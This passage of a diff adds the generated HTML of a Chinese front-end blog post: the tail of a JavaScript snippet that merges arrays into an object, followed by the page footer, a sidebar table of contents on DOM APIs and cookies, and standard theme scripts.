class="keyword">in</span> left)&#123;</span><br><span class="line">          <span class="keyword">if</span>(res.hasOwnProperty(left[i]))&#123;<span class="comment">//如果包含重复元素</span></span><br><span class="line">              <span class="keyword">if</span>(<span class="built_in">Array</span>.isArray(res[left[i]]))&#123;<span class="comment">//如果已经是数组就直接添加</span></span><br><span class="line">                  res[left[i]].push(right[i])</span><br><span class="line">              &#125;<span class="keyword">else</span>&#123;<span class="comment">//如果不是数组则构造成数组</span></span><br><span class="line">                  <span class="keyword">let</span> tmp = <span class="keyword">new</span> <span class="built_in">Array</span>(res[left[i]])</span><br><span class="line">                  tmp.push(right[i])   <span class="comment">//push的返回值为push的值</span></span><br><span class="line">                  res[left[i]] = tmp</span><br><span class="line">              &#125;    </span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">              res[left[i]] = right[i]</span><br><span class="line">          &#125;   </span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/22/日常-2020.3.22/" rel="next" title="日常-2020.3.22">
+                <i class="fa fa-chevron-left"></i> 日常-2020.3.22
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/27/日常-2020.3.27/" rel="prev" title="日常-2020.3.27">
+                日常-2020.3.27 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="Breeze" />
+            
+              <p class="site-author-name" itemprop="name">Breeze</p>
+              <p class="site-description motion-element" itemprop="description">漫漫长路，伴你同行</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">86</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-原生JS操作DOM的API"><span class="nav-number">1.</span> <span class="nav-text">2. 原生JS操作DOM的API</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#一-、创建型API总结"><span class="nav-number">1.0.1.</span> <span class="nav-text">一 、创建型API总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二、-页面修改型API总结"><span class="nav-number">1.0.2.</span> <span class="nav-text">二、 页面修改型API总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#三、-节点查询型API总结"><span class="nav-number">1.0.3.</span> <span class="nav-text">三、 节点查询型API总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#四、节点关系型API总结"><span class="nav-number">1.0.4.</span> <span class="nav-text">四、节点关系型API总结</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#五、元素属性型API"><span class="nav-number">1.0.5.</span> <span class="nav-text">五、元素属性型API</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#六、元素样式型API"><span class="nav-number">1.0.6.</span> <span class="nav-text">六、元素样式型API</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-不同源就不能传送cookie了吗"><span class="nav-number">2.</span> <span class="nav-text">3. 不同源就不能传送cookie了吗</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#什么是Session"><span class="nav-number">2.1.</span> <span class="nav-text">什么是Session</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie和Session关系"><span class="nav-number">2.2.</span> <span class="nav-text">Cookie和Session关系</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie带来的安全性问题"><span class="nav-number">2.3.</span> <span class="nav-text">Cookie带来的安全性问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#如何防御"><span class="nav-number">2.4.</span> <span class="nav-text">如何防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-一道处理字符串的代码题"><span class="nav-number">3.</span> <span class="nav-text">4. 一道处理字符串的代码题</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Breeze</span>
+
+  
+</div>
+
+
+  <!--<div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>!-->
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+
+  <!--<div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>!-->
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+</body>
+</html>
